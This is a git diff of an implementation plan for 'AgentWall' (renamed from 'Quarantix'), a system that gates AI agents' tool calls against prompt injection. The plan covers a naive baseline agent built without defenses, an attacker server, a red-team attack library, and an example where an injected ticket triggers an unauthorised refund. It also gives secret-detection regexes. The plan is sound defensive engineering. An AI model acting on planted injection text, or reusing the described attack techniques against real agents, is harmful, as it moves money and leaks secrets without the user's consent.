@@ -1,4 +1,4 @@
-# Quarantix — Implementation Plan (v2, optimized)
+# AgentWall — Implementation Plan (v2, optimized)
 
 > **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
 
@@ -18,7 +18,7 @@
 
 | # | v1 | v2 | Why it is better |
 |---|---|---|---|
-| 1 | "Off" mode = same planner with an allow-all policy | **Off = a naive tool-calling agent** (what companies run today). **On = the same agent wrapped by `quarantix.guard()`**. **Full = planner/interpreter** | With allow-all, the safe plan structure still neutralizes most attacks, so the "damage" baseline would be fake and the attack-success metric dishonest. The naive agent gives a real baseline. Wrapping that same agent also proves the drop-in claim |
+| 1 | "Off" mode = same planner with an allow-all policy | **Off = a naive tool-calling agent** (what companies run today). **On = the same agent wrapped by `agentwall.guard()`**. **Full = planner/interpreter** | With allow-all, the safe plan structure still neutralizes most attacks, so the "damage" baseline would be fake and the attack-success metric dishonest. The naive agent gives a real baseline. Wrapping that same agent also proves the drop-in claim |
 | 2 | Enforcement logic spread across interpreter, SDK, proxy and API | **One `Gate.check(req) -> Decision`** (pure, no I/O) + **one `GateRuntime`** (approvals, events, execution) used by all of them | Rules are written once and tested once. The decision path costs well under 1 ms. Interpreter, SDK and proxy cannot disagree |
 | 3 | `Decision.path: list[str]` | **`Provenance` graph** (`nodes` + `edges`), built as values are produced | Data flows form a DAG, which a list cannot represent. The graph also maps 1:1 onto React Flow, so the UI needs no transformation |
 | 4 | `Step` left as `...` | **Full plan language frozen in Phase 0** (discriminated union on `op`) | The plan format is the most-shared contract. If it isn't frozen, A and B block each other |
@@ -50,13 +50,13 @@
 Every task's requirements implicitly include this section.
 
 - Python **3.12**. Dependencies via **uv** (`uv.lock` committed). Node 20 + **pnpm** for `dashboard/`.
-- **Core never names a domain:** `quarantix/{core,ai,engine,guard,sdk}` may not contain the whole words `tickets?|refunds?|customers?|invoices?|repos?|deploys?|order_id` (case-insensitive, `\b`-bounded). Plain "order" is left out because it is ordinary English ("in order of"). An architecture test enforces this. Domains live only in `demo/`, `policies/` and `redteam/`.
+- **Core never names a domain:** `agentwall/{core,ai,engine,guard,sdk}` may not contain the whole words `tickets?|refunds?|customers?|invoices?|repos?|deploys?|order_id` (case-insensitive, `\b`-bounded). Plain "order" is left out because it is ordinary English ("in order of"). An architecture test enforces this. Domains live only in `demo/`, `policies/` and `redteam/`.
 - **Layering (import-linter):** `core` ← `engine` ← `guard` ← `sdk`; `ai` depends only on `core`. **`ai.reader` must not import `core.registry`, `engine` or `guard`**. `api` may import everything. Nothing imports `api` except `api`.
 - **Security decisions are never made by an LLM.** LLM output is untrusted input to our code and is validated before use.
 - **Default deny:** an unregistered tool gets `kind="sink", risk="high", audience="external", critical_args=("*",)`. An unanswered approval is denied after **120 s**. An offline SDK turns `ask` into `block`.
 - **Claude API:** use `anthropic.AsyncAnthropic`. **Never send `temperature`, `top_p` or `top_k`.** No assistant prefill. Structured output uses `client.messages.parse(..., output_format=<PydanticModel>)`. Always check `stop_reason == "refusal"` before reading content.
 - **Models (env-configurable):** `PLANNER_MODEL=claude-opus-5-5` (effort `medium`), `READER_MODEL=claude-haiku-5-5` (effort `low`), `BASELINE_MODEL=claude-haiku-5-5`. Optional local reader: `READER_BACKEND=ollama`, `OLLAMA_MODEL=qwen2.5:7b-instruct`.
-- **Env vars:** `ANTHROPIC_API_KEY`, `LLM_MODE=live|record|replay` (CI = `replay`), `QUARANTIX_ADMIN_TOKEN`, `QUARANTIX_AGENT_KEYS` (comma list `agent:key`), `QUARANTIX_DB=sqlite+aiosqlite:///data/quarantix.db`, `QUARANTIX_CLOUD_URL`.
+- **Env vars:** `ANTHROPIC_API_KEY`, `LLM_MODE=live|record|replay` (CI = `replay`), `AGENTWALL_ADMIN_TOKEN`, `AGENTWALL_AGENT_KEYS` (comma list `agent:key`), `AGENTWALL_DB=sqlite+aiosqlite:///data/agentwall.db`, `AGENTWALL_CLOUD_URL`.
 - **Ports:** API + dashboard 8000, guard proxy 8787, DevOps fake tool server 8100, attacker server 9000, Ollama 11434, Vite dev 5173.
 - **Timeouts:** approval 120 s, long-poll `wait` 25 s, LLM request 30 s with SDK default `max_retries=2`, run wall-clock 180 s (approval waits excluded).
 - **Interpreter limits:** max 40 plan steps, nesting depth ≤ 3, `for_each` ≤ 50 items, ≤ 100 tool calls per run.
@@ -100,7 +100,7 @@ These are the failure modes the spec implies that are most likely to bite a real
 
 ### Hackathon done (judges must see)
 
-- [ ] One engine protects **two unrelated agents** (support + DevOps). `git diff` of `quarantix/` between the two agent demos is empty.
+- [ ] One engine protects **two unrelated agents** (support + DevOps). `git diff` of `agentwall/` between the two agent demos is empty.
 - [ ] **Off:** a live attack against the naive agent visibly damages the attacker page (money or secrets arrive).
 - [ ] **On** (same agent, `guard()`): the same attack is **blocked**, and the website shows the provenance graph and the rule.
 - [ ] Genuine tasks still succeed with protection on.
@@ -165,7 +165,7 @@ At each checkpoint, cut scope by the priority tags if the check fails. Never cut
                  ┌──────────────────────────── ways in ───────────────────────────────┐
  Full mode:   Planner(LLM, trusted input only) → Plan → Interpreter ──┐
                                    Reader(LLM, quarantined) ◄─ extract │
- Guard mode:  any agent → quarantix.guard(tools) → GuardSession ──────┤   ToolCallRequest
+ Guard mode:  any agent → agentwall.guard(tools) → GuardSession ──────┤   ToolCallRequest
               any agent → HTTP proxy :8787        → GuardSession ──────┤   (labels + evidence)
  Dry run:     POST /v1/check ──────────────────────────────────────────┘
                                                                         ▼
@@ -190,8 +190,8 @@ At each checkpoint, cut scope by the priority tags if the check fails. Never cut
 ## 4. Repository layout
 
 ```text
-quarantix/                          # repo root
-├── quarantix/                      # Python package
+agentwall/                          # repo root
+├── agentwall/                      # Python package
 │   ├── __init__.py                 # re-exports: tool, run, init, guard, session
 │   ├── core/
 │   │   ├── labels.py               # Integrity, Conf, Label, Labeled, join_all     (B)
@@ -240,7 +240,7 @@ quarantix/                          # repo root
 │   ├── attacks/*.yaml  benign/*.yaml  replays/*.yaml                               (D)
 │   ├── checks.py                   # success-check kinds                           (D)
 │   └── runner.py                   # python -m redteam.runner                      (D)
-├── dashboard/                      # React app; build → quarantix/api/static       (C)
+├── dashboard/                      # React app; build → agentwall/api/static       (C)
 ├── scripts/{demo_core.py,ic2.py,gen_types.sh,warm_cassettes.py}
 ├── tests/{core,engine,ai,guard,sdk,api,demo,redteam}/ + test_architecture.py
 ├── Dockerfile  docker-compose.yml  pyproject.toml  .importlinter
@@ -251,7 +251,7 @@ quarantix/                          # repo root
 
 ## 5. Frozen contracts (merged at H2; full code because everyone builds against them)
 
-### 5.1 `quarantix/core/labels.py`
+### 5.1 `agentwall/core/labels.py`
 
 ```python
 class Integrity(IntEnum):  TRUSTED = 0; UNTRUSTED = 1
@@ -281,7 +281,7 @@ def trusted(value, source: str, conf: Conf = Conf.INTERNAL) -> Label
 def untrusted(value, source: str, conf: Conf = Conf.INTERNAL) -> Label
 ```
 
-### 5.2 `quarantix/core/registry.py`
+### 5.2 `agentwall/core/registry.py`
 
 ```python
 Audience = Literal["self", "internal", "external", "public"]
@@ -311,7 +311,7 @@ def tool(registry: Registry, *, kind, description=None, output_label=..., field_
          endorses_output=False, audience="external", risk="high", critical_args=()) -> Callable
 ```
 
-### 5.3 `quarantix/core/contracts.py` (Pydantic v2, `model_config = ConfigDict(extra="forbid")`)
+### 5.3 `agentwall/core/contracts.py` (Pydantic v2, `model_config = ConfigDict(extra="forbid")`)
 
 ```python
 # ---- labels on the wire
@@ -441,12 +441,12 @@ success_check: {kind: ledger_contains, ledger: refunds, where: {amount: 4999.0}}
 **Files:** Create `pyproject.toml`, `uv.lock`, `.pre-commit-config.yaml`, `.importlinter`, `.github/workflows/ci.yml`, `.env.example`, `.gitignore`, `tests/test_architecture.py`
 
 - [ ] `pyproject.toml`: deps `fastapi uvicorn[standard] pydantic>=2.7 sqlalchemy>=2 aiosqlite httpx anthropic pyyaml sse-starlette`; dev deps `pytest pytest-asyncio hypothesis respx ruff pyright import-linter`. Set `asyncio_mode = "auto"`.
-- [ ] `.importlinter` contracts: layers `quarantix.api > quarantix.sdk > quarantix.guard > quarantix.engine > quarantix.core`; forbidden `quarantix.ai.reader → quarantix.core.registry | quarantix.engine | quarantix.guard`; forbidden `quarantix.ai → quarantix.engine`.
+- [ ] `.importlinter` contracts: layers `agentwall.api > agentwall.sdk > agentwall.guard > agentwall.engine > agentwall.core`; forbidden `agentwall.ai.reader → agentwall.core.registry | agentwall.engine | agentwall.guard`; forbidden `agentwall.ai → agentwall.engine`.
 - [ ] Test `tests/test_architecture.py`:
   ```python
   def test_core_has_no_domain_words():
       bad = re.compile(r"\b(tickets?|refunds?|customers?|invoices?|repos?|deploys?|order_id)\b", re.I)
-      hits = [f"{p}:{i}" for p in Path("quarantix").glob("{core,ai,engine,guard,sdk}/**/*.py")
+      hits = [f"{p}:{i}" for p in Path("agentwall").glob("{core,ai,engine,guard,sdk}/**/*.py")
               for i, line in enumerate(p.read_text().splitlines(), 1) if bad.search(line)]
       assert hits == []
   def test_import_contracts(): assert subprocess.run(["lint-imports"]).returncode == 0
@@ -458,7 +458,7 @@ success_check: {kind: ledger_contains, ledger: refunds, where: {amount: 4999.0}}
 
 ### Task 0.2 [MUST] Contracts + labels (B, reviewed by all)
 
-**Files:** Create `quarantix/core/{labels,contracts}.py`, `tests/core/test_contracts.py`
+**Files:** Create `agentwall/core/{labels,contracts}.py`, `tests/core/test_contracts.py`
 
 - [ ] Tests:
   ```python
@@ -497,7 +497,7 @@ class World:
 ### Task 0.5 [MUST] Dashboard scaffold (C)
 
 - [ ] `pnpm create vite dashboard --template react-ts`, Tailwind, shadcn/ui init, React Router with 6 empty routes, `vite.config.ts` proxy `/v1 → :8000`.
-- [ ] `scripts/gen_types.sh`: `uv run python -c "from quarantix.api.main import create_app; import json; print(json.dumps(create_app().openapi()))" > dashboard/openapi.json && pnpm --dir dashboard openapi-typescript openapi.json -o src/api/types.ts`.
+- [ ] `scripts/gen_types.sh`: `uv run python -c "from agentwall.api.main import create_app; import json; print(json.dumps(create_app().openapi()))" > dashboard/openapi.json && pnpm --dir dashboard openapi-typescript openapi.json -o src/api/types.ts`.
 - [ ] **Commit:** `chore(dashboard): scaffold`
 
 ---
@@ -506,7 +506,7 @@ class World:
 
 ### Task 1.1 [MUST] Labels: properties + helpers (B)
 
-**Files:** Modify `quarantix/core/labels.py`; Test `tests/core/test_labels.py`
+**Files:** Modify `agentwall/core/labels.py`; Test `tests/core/test_labels.py`
 
 - [ ] Tests (hypothesis strategy `labels()` over all enum values and source sets of size 0–3):
   ```python
@@ -525,7 +525,7 @@ class World:
 
 ### Task 1.2 [MUST] Tool registry (A)
 
-**Files:** Create `quarantix/core/registry.py`; Test `tests/core/test_registry.py`
+**Files:** Create `agentwall/core/registry.py`; Test `tests/core/test_registry.py`
 
 **Interfaces — Produces:** §5.2 exactly. `arg_schema` comes from `pydantic.TypeAdapter` over a model generated from `inspect.signature(fn)` (`create_model(name, **{p: (annotation, default)})`). Sync `fn` is invoked via `asyncio.to_thread` by the runtime, not here.
 
@@ -541,7 +541,7 @@ class World:
 
 ### Task 1.3 [MUST] Provenance graph (B)
 
-**Files:** Create `quarantix/core/provenance.py`; Test `tests/core/test_provenance.py`
+**Files:** Create `agentwall/core/provenance.py`; Test `tests/core/test_provenance.py`
 
 **Interfaces — Produces:**
 ```python
@@ -555,7 +555,7 @@ class ProvenanceGraph:
 
 ### Task 1.4 [MUST] Policy engine (B)
 
-**Files:** Create `quarantix/engine/policy.py`; Test `tests/engine/test_policy.py`, `tests/engine/test_policy_yaml.py`
+**Files:** Create `agentwall/engine/policy.py`; Test `tests/engine/test_policy.py`, `tests/engine/test_policy_yaml.py`
 
 **Interfaces:**
 - Consumes: `ToolCallRequest`, `ToolSpec`, `Decision`, `LabelModel`.
@@ -619,7 +619,7 @@ matched = names of every fired/matched rule; reason = template of the deciding r
 
 ### Task 1.5 [MUST] Gate + GateRuntime (B)
 
-**Files:** Create `quarantix/engine/{gate,approvals}.py`; Test `tests/engine/test_gate.py`
+**Files:** Create `agentwall/engine/{gate,approvals}.py`; Test `tests/engine/test_gate.py`
 
 **Interfaces — Produces:**
 ```python
@@ -646,12 +646,12 @@ class InProcessApprovalBroker:  # futures keyed by approval id; resolve(id, verd
 ```
 - [ ] Behavior: `offline()` true and decision `ask` → `block` with rule `runtime/offline-no-approver`. Mode `off` → skip `check` entirely, execute, emit nothing (true baseline). Approval scope `run` caches `(run_id, tool, rule)` → later identical asks auto-approve. Exactly **one `tool.call` event per call**, emitted after the outcome is known (`approval.requested`/`resolved` are separate events).
 - [ ] Tests: `test_block_raises_and_emits_one_event`, `test_monitor_executes_and_marks_not_enforced`, `test_off_mode_emits_nothing`, `test_ask_waits_for_approval_then_executes`, `test_ask_timeout_denies` (inject `timeout=0.05`), `test_offline_turns_ask_into_block`, `test_run_scope_approval_reused`, `test_secret_arg_preview_redacted` (uses `core/redact.preview`).
-- [ ] Also create `quarantix/core/redact.py`: `preview(value, label) -> ArgPreview`. Scrubbers: `AKIA[0-9A-Z]{16}`, `sk-[A-Za-z0-9_-]{20,}`, `ghp_[A-Za-z0-9]{36}`, JWT `eyJ[\w-]+\.[\w-]+\.[\w-]+`, PEM blocks, 13–19 digit Luhn-valid numbers → `«masked»`. Then truncate to 40 chars. `sha256` over the full canonical JSON.
+- [ ] Also create `agentwall/core/redact.py`: `preview(value, label) -> ArgPreview`. Scrubbers: `AKIA[0-9A-Z]{16}`, `sk-[A-Za-z0-9_-]{20,}`, `ghp_[A-Za-z0-9]{36}`, JWT `eyJ[\w-]+\.[\w-]+\.[\w-]+`, PEM blocks, 13–19 digit Luhn-valid numbers → `«masked»`. Then truncate to 40 chars. `sha256` over the full canonical JSON.
 - [ ] **Commit:** `feat(engine): single enforcement gate and runtime`
 
 ### Task 1.6 [MUST] Interpreter (B)
 
-**Files:** Create `quarantix/engine/interpreter.py`; Test `tests/engine/test_interpreter.py`, `tests/engine/fixtures.py` (`SUPPORT_PLAN_JSON`, fake tools)
+**Files:** Create `agentwall/engine/interpreter.py`; Test `tests/engine/test_interpreter.py`, `tests/engine/fixtures.py` (`SUPPORT_PLAN_JSON`, fake tools)
 
 **Interfaces:**
 - Consumes: `Plan`, `Registry`, `GateRuntime`, `ProvenanceGraph`, a `Reader`-shaped object with `async extract(source: Labeled, fields: dict[str,str]) -> Labeled`.
@@ -671,7 +671,7 @@ class InProcessApprovalBroker:  # futures keyed by approval id; resolve(id, verd
 - **Tool result label:** with `endorses_output`, it is `output_label`. Otherwise `output_label ⊔ join(arg labels) ⊔ ctx`. `field_labels` override per field, still joined with args and ctx unless endorsed. Each result gets a provenance node `tool` with parents = arg nodes.
 - Sink call → build `ToolCallRequest(mode="full", evidence="exact")` → `runtime.enforce`. A block marks the step `blocked` and binds `out` to a `BLOCKED` sentinel. **Any later step that references a `BLOCKED` or failed value is `skipped`**, so data flow decides what is safe to continue.
 - `for_each` runs iterations concurrently with `asyncio.Semaphore(4)`, in order of completion. Events carry `data.iteration`. Truncate to `limits.max_items` and emit a `limit` event.
-- `return`: render the value. Run **C4**: regex `https?://[^\s)>\]]+` and markdown images. For a disallowed host with answer conf ≥ INTERNAL, replace with `[link removed by Quarantix]` and emit `answer.link_stripped`.
+- `return`: render the value. Run **C4**: regex `https?://[^\s)>\]]+` and markdown images. For a disallowed host with answer conf ≥ INTERNAL, replace with `[link removed by AgentWall]` and emit `answer.link_stripped`.
 - Status: `ok` if no step blocked, skipped or errored. `partial` if some did. `failed` if nothing executed.
 
 - [ ] Tests:
@@ -700,7 +700,7 @@ class InProcessApprovalBroker:  # futures keyed by approval id; resolve(id, verd
   BLOCKED  pay(amount=4999.00)  rule=core/C1-untrusted-critical-arg
            amount ← extract(s3) ← tool:read_ticket#T-102 (untrusted)
   ```
-  (The core uses generic names. Demo names live in the script, which sits outside `quarantix/`.)
+  (The core uses generic names. Demo names live in the script, which sits outside `agentwall/`.)
 - [ ] **Verify (IC1):** `uv run python scripts/demo_core.py` exits 0 with both lines.
 - [ ] **Commit:** `feat: core demo script`
 
@@ -712,7 +712,7 @@ class InProcessApprovalBroker:  # futures keyed by approval id; resolve(id, verd
 
 ### Task 2.1 [MUST] LLM clients + cassettes (A)
 
-**Files:** Create `quarantix/ai/{llm,cassette}.py`; Test `tests/ai/test_cassette.py`
+**Files:** Create `agentwall/ai/{llm,cassette}.py`; Test `tests/ai/test_cassette.py`
 
 **Interfaces — Produces:**
 ```python
@@ -733,7 +733,7 @@ class CassetteLLM(LLMClient):
 
 ### Task 2.2 [MUST] Quarantined reader (A)
 
-**Files:** Create `quarantix/ai/reader.py`; Test `tests/ai/test_reader.py`
+**Files:** Create `agentwall/ai/reader.py`; Test `tests/ai/test_reader.py`
 
 **Interfaces — Produces:**
 ```python
@@ -753,7 +753,7 @@ class Reader:
 
 ### Task 2.3 [MUST] Planner + static validator (A)
 
-**Files:** Create `quarantix/ai/{planner,plan_validate}.py`, `quarantix/ai/prompts/planner_v1.md`; Test `tests/ai/test_planner.py`, `tests/ai/test_plan_validate.py`
+**Files:** Create `agentwall/ai/{planner,plan_validate}.py`, `agentwall/ai/prompts/planner_v1.md`; Test `tests/ai/test_planner.py`, `tests/ai/test_plan_validate.py`
 
 **Interfaces — Produces:**
 ```python
@@ -788,7 +788,7 @@ class Planner:
 
 ### Task 2.4 [MUST] Naive baseline agent (A)
 
-**Files:** Create `quarantix/ai/baseline.py`; Test `tests/ai/test_baseline.py`
+**Files:** Create `agentwall/ai/baseline.py`; Test `tests/ai/test_baseline.py`
 
 **Interfaces — Produces:**
 ```python
@@ -797,15 +797,15 @@ class NaiveAgent:
     def __init__(self, llm: LLMClient, model: str, tools: list[dict], invoke: ToolInvoker, *, max_turns: int = 12)
     async def run(self, request: str, system: str = DEFAULT_SYSTEM) -> NaiveResult   # answer, transcript, tool_calls
 ```
-- [ ] Manual loop over `llm.tool_turn`. Execute all `tool_use` blocks of one turn concurrently and return **all** `tool_result` blocks in one user message. A `ToolBlocked` becomes `tool_result(is_error=True, content="Blocked by Quarantix: <reason>")`, so the agent keeps going and the demo shows a graceful refusal. Tool definitions come from `Registry.catalog()` with `strict: True`.
+- [ ] Manual loop over `llm.tool_turn`. Execute all `tool_use` blocks of one turn concurrently and return **all** `tool_result` blocks in one user message. A `ToolBlocked` becomes `tool_result(is_error=True, content="Blocked by AgentWall: <reason>")`, so the agent keeps going and the demo shows a graceful refusal. Tool definitions come from `Registry.catalog()` with `strict: True`.
 - [ ] `DEFAULT_SYSTEM` is a typical production prompt ("You are a helpful support operations agent… use tools to complete the task"). **Do not** add injection defenses. This is the realistic baseline.
 - [ ] Honesty note for Q&A: current Claude models resist many crude injections. D picks demo attacks from the runner's measured baseline successes, and the Results page reports the baseline model. `BASELINE_MODEL` can point at a smaller local model to show the trend.
 - [ ] Tests (fake LLM): `test_parallel_tool_results_in_one_message`, `test_blocked_tool_becomes_error_result`, `test_stops_at_max_turns`.
 - [ ] **Commit:** `feat(ai): naive tool-calling baseline agent`
 
-### Task 2.5 [MUST] Wiring `quarantix.run` (A + B)
+### Task 2.5 [MUST] Wiring `agentwall.run` (A + B)
 
-**Files:** Modify `quarantix/__init__.py`; Create `scripts/ic2.py`; Test `tests/test_e2e_full.py`
+**Files:** Modify `agentwall/__init__.py`; Create `scripts/ic2.py`; Test `tests/test_e2e_full.py`
 
 - [ ] `async def run(request: str, *, registry: Registry, runtime: GateRuntime, llm: LLMClient, agent: str) -> RunResult`: emit `run.started` → `Planner.plan` (`plan.created` with the plan JSON | `plan.rejected`) → `run_plan` → `run.finished` with status and answer preview.
 - [ ] Tests (replay cassettes): `test_support_task_end_to_end_refunds_genuine_only`, `test_injected_ticket_neutralized_or_blocked` (assert the refunds ledger equals the expected set and the attacker server receives nothing).
@@ -820,7 +820,7 @@ class NaiveAgent:
 
 ### Task 3.1 [MUST] Store (C)
 
-**Files:** Create `quarantix/api/store.py`; Test `tests/api/test_store.py`
+**Files:** Create `agentwall/api/store.py`; Test `tests/api/test_store.py`
 
 **Tables** (SQLAlchemy Core):
 
@@ -840,7 +840,7 @@ class NaiveAgent:
 
 ### Task 3.2 [MUST] Event bus + SSE (C)
 
-**Files:** Create `quarantix/api/{bus,sse}.py`; Test `tests/api/test_bus.py`, `tests/api/test_sse.py`
+**Files:** Create `agentwall/api/{bus,sse}.py`; Test `tests/api/test_bus.py`, `tests/api/test_sse.py`
 
 **Interfaces — Produces:**
 ```python
@@ -857,7 +857,7 @@ class EventBus(EventSink):
 
 ### Task 3.3 [MUST] Routes, auth, approvals, runs (C)
 
-**Files:** Create `quarantix/api/{main,auth}.py`; Test `tests/api/test_routes.py`
+**Files:** Create `agentwall/api/{main,auth}.py`; Test `tests/api/test_routes.py`
 
 | Method and path | Auth | Purpose |
 |---|---|---|
@@ -880,12 +880,12 @@ class EventBus(EventSink):
 | `POST /v1/lab/run` | admin | Task 5.4 |
 | `POST/GET /v1/redteam/results` | admin | upload / read runner output |
 
-- [ ] Auth: `QUARANTIX_AGENT_KEYS="support-agent:awk_…,devops-agent:awk_…"`. At boot, store `sha256(key)`. Compare with `hmac.compare_digest`. The key determines the agent name, so a request body cannot claim another agent.
+- [ ] Auth: `AGENTWALL_AGENT_KEYS="support-agent:awk_…,devops-agent:awk_…"`. At boot, store `sha256(key)`. Compare with `hmac.compare_digest`. The key determines the agent name, so a request body cannot claim another agent.
 - [ ] Bundle long-poll: `asyncio.Condition` notified on every pack/mode change. The handler waits on `wait_for(version != if_none_match, timeout=wait)`.
 - [ ] Approval long-poll: the same pattern over `InProcessApprovalBroker` futures. Full-mode runs inside the API use the broker directly.
-- [ ] Serve `quarantix/api/static/` (dashboard build) at `/` with SPA fallback to `index.html`.
+- [ ] Serve `agentwall/api/static/` (dashboard build) at `/` with SPA fallback to `index.html`.
 - [ ] Tests: `test_agent_key_binds_agent_name`, `test_bundle_304_when_unchanged`, `test_bundle_longpoll_returns_on_change_under_1s`, `test_approval_resolve_twice_409`, `test_approval_longpoll_returns_on_resolve`, `test_put_invalid_pack_returns_line`.
-- [ ] **Verify (IC2 API half):** `uv run uvicorn quarantix.api.main:app` → `curl -X POST :8000/v1/runs …` and `curl -N ':8000/v1/events/stream?token=…'` shows the run's events.
+- [ ] **Verify (IC2 API half):** `uv run uvicorn agentwall.api.main:app` → `curl -X POST :8000/v1/runs …` and `curl -N ':8000/v1/events/stream?token=…'` shows the run's events.
 - [ ] **Commit:** `feat(api): control plane routes, long-poll sync and approvals`
 
 ---
@@ -953,7 +953,7 @@ Techniques, at least one per agent each: direct order · hidden text (HTML comme
 **Interfaces — Produces:** `python -m redteam.runner --modes baseline,guard,full --agents support,devops --concurrency 4 --ask-policy deny|approve|both --out redteam/results.json [--upload]`
 
 - [ ] Per case: `world = World.load(agent).clone()` → plant → reset attacker → run in mode → evaluate check → record `{case, mode, outcome: succeeded|blocked|neutralized|asked|error, decisions, approvals, latency_s}`. **Neutralized** = attack check false and no block event (the payload had no effect).
-- [ ] Modes: `baseline` = NaiveAgent with plain invoker; `guard` = NaiveAgent with `GuardSession.call` invoker; `full` = `quarantix.run`.
+- [ ] Modes: `baseline` = NaiveAgent with plain invoker; `guard` = NaiveAgent with `GuardSession.call` invoker; `full` = `agentwall.run`.
 - [ ] Asks: `--ask-policy both` runs attacks twice (asks denied / approved) and reports both ASRs. Benign tasks always auto-approve and count the approval rate.
 - [ ] Metrics per agent × mode: ASR, TSR, false-block rate (benign with ≥ 1 block), approval rate (asks / sink calls), median and p90 overhead vs baseline. **Wilson 95% intervals** on each rate. Output JSON + Markdown table to stdout.
 - [ ] Concurrency via `asyncio.Semaphore`. `replay` mode runs the whole suite in CI in < 60 s.
@@ -987,7 +987,7 @@ Techniques, at least one per agent each: direct order · hidden text (HTML comme
 
 ### Task 5.4 [MUST] Attack lab (C + D)
 
-**Files:** Create `quarantix/api/lab.py`, `dashboard/src/pages/AttackLab.tsx`
+**Files:** Create `agentwall/api/lab.py`, `dashboard/src/pages/AttackLab.tsx`
 
 - [ ] `POST /v1/lab/run {agent, payload, target?, modes: ["baseline","guard","full"]}` → for each mode concurrently: a fresh `World.clone()` with the payload planted into the default target (support: new ticket text; DevOps: a log line), run, and return `{mode, outcome, attacker_hits, decisions[], answer}`. Rate limit: 1 concurrent lab run per client and 30 s max.
 - [ ] UI: an agent picker, a preset dropdown (from the attack library) or free text, and one **Run** button. Three columns (Naive / Guard / Full), each with an outcome badge (💥 Succeeded / 🛡 Blocked / ⚪ Neutralized / ✋ Needs approval), attacker hits, and the decisive path graph.
@@ -1015,7 +1015,7 @@ Techniques, at least one per agent each: direct order · hidden text (HTML comme
 
 ### Task 6.1 [MUST] Tracer, token level (B)
 
-**Files:** Create `quarantix/guard/tracing.py`; Test `tests/guard/test_tracing.py`
+**Files:** Create `agentwall/guard/tracing.py`; Test `tests/guard/test_tracing.py`
 
 **Interfaces — Produces:**
 ```python
@@ -1046,7 +1046,7 @@ trace(v):  M = matched tokens of v
 
 ### Task 6.2 [MUST] GuardSession (B)
 
-**Files:** Create `quarantix/guard/session.py`; Test `tests/guard/test_session.py`
+**Files:** Create `agentwall/guard/session.py`; Test `tests/guard/test_session.py`
 
 **Interfaces — Produces:**
 ```python
@@ -1064,11 +1064,11 @@ class GuardSession:
 
 ### Task 6.3 [MUST] SDK (B API, C transport)
 
-**Files:** Create `quarantix/sdk/{client,sync,transport}.py`; Test `tests/sdk/test_sdk.py`
+**Files:** Create `agentwall/sdk/{client,sync,transport}.py`; Test `tests/sdk/test_sdk.py`
 
 **Interfaces — Produces:**
 ```python
-def init(*, api_key: str, agent: str, cloud_url: str, cache_dir: Path = Path("~/.quarantix"), registry: Registry | None = None) -> None
+def init(*, api_key: str, agent: str, cloud_url: str, cache_dir: Path = Path("~/.agentwall"), registry: Registry | None = None) -> None
 def guard(fns: Sequence[Callable]) -> list[Callable]           # same signatures; each call → current session's GuardSession.call
 @contextmanager
 def session(user_message: str | None = None) -> Iterator[GuardSession]   # also a contextvar-scoped default session
@@ -1088,12 +1088,12 @@ class HttpApprovalBroker(ApprovalBroker): # POST /v1/approvals → long-poll GET
 
 - [ ] The SDK never blocks the agent's event loop on the network. All transport runs in one background `asyncio` task (or a daemon thread with its own loop for sync agents).
 - [ ] Tests (respx): `test_policy_change_applies_under_1s`, `test_offline_uses_cached_bundle`, `test_offline_ask_becomes_block`, `test_cold_offline_blocks_high_risk`, `test_events_buffer_and_flush_on_reconnect`, `test_guarded_fn_keeps_signature`.
-- [ ] Integration: `demo/run_support_guarded.py` = NaiveAgent + `quarantix.guard(support tools)`, about 10 lines. This file *is* the drop-in pitch slide.
+- [ ] Integration: `demo/run_support_guarded.py` = NaiveAgent + `agentwall.guard(support tools)`, about 10 lines. This file *is* the drop-in pitch slide.
 - [ ] **Commit:** `feat(sdk): local enforcement with long-poll sync and fail-safe`
 
 ### Task 6.4 [SHOULD] HTTP guard proxy (B)
 
-**Files:** Create `quarantix/guard/proxy.py`, `demo/proxy.yaml`; Test `tests/guard/test_proxy.py`
+**Files:** Create `agentwall/guard/proxy.py`, `demo/proxy.yaml`; Test `tests/guard/test_proxy.py`
 
 - [ ] `create_proxy_app(config: ProxyConfig) -> FastAPI`. `POST /call {session_id, tool, args, user_message?}` → `GuardSession` (one per `session_id`, LRU of 1000, idle TTL 30 min) → forward to `upstreams[tool]` (`POST {url}/tools/{tool}`) using a pooled `httpx.AsyncClient`. The response is `{ok, result}` or `{ok: false, blocked: Decision}` with HTTP 403. Tool labels come from `proxy.yaml` (same fields as `ToolSpec`), so we don't need the agent's code.
 - [ ] The DevOps NaiveAgent's invoker POSTs to the proxy (proves "agents we didn't build").
@@ -1104,13 +1104,13 @@ class HttpApprovalBroker(ApprovalBroker): # POST /v1/approvals → long-poll GET
 
 **Files:** Create `Dockerfile`, `docker-compose.yml`, `.github/workflows/images.yml`
 
-- [ ] **One multi-stage Dockerfile:** stage 1 `node:20-slim` builds the dashboard; stage 2 `ghcr.io/astral-sh/uv:python3.12-bookworm-slim` runs `uv sync --frozen --no-dev` (cache mount), copies the package + `dashboard/dist → quarantix/api/static`; non-root user.
-- [ ] Compose services, all `image: ghcr.io/<org>/quarantix:demo`, differing by `command:`:
+- [ ] **One multi-stage Dockerfile:** stage 1 `node:20-slim` builds the dashboard; stage 2 `ghcr.io/astral-sh/uv:python3.12-bookworm-slim` runs `uv sync --frozen --no-dev` (cache mount), copies the package + `dashboard/dist → agentwall/api/static`; non-root user.
+- [ ] Compose services, all `image: ghcr.io/<org>/agentwall:demo`, differing by `command:`:
 
 | Service | Command | Port | Depends on |
 |---|---|---|---|
-| `api` | `uvicorn quarantix.api.main:app --host 0.0.0.0 --port 8000 --workers 1` | 8000 | — (healthcheck `/healthz`) |
-| `proxy` | `uvicorn quarantix.guard.proxy:app --port 8787` | 8787 | api healthy |
+| `api` | `uvicorn agentwall.api.main:app --host 0.0.0.0 --port 8000 --workers 1` | 8000 | — (healthcheck `/healthz`) |
+| `proxy` | `uvicorn agentwall.guard.proxy:app --port 8787` | 8787 | api healthy |
 | `tools` | `uvicorn demo.tool_server:app --port 8100` | 8100 | — |
 | `attacker` | `uvicorn demo.attacker_server:app --port 9000` | 9000 | — |
 | `support-agent` | `python -m demo.run_support_guarded --loop` | — | api healthy |
@@ -1174,7 +1174,7 @@ class HttpApprovalBroker(ApprovalBroker): # POST /v1/approvals → long-poll GET
   3. *On:* flip the agent to **Enforce** on the Live page (< 1 s). Rerun → **BLOCKED by C1**. Open the path graph: `amount ← ticket T-102 (untrusted)`. The genuine refund still goes through. (45 s)
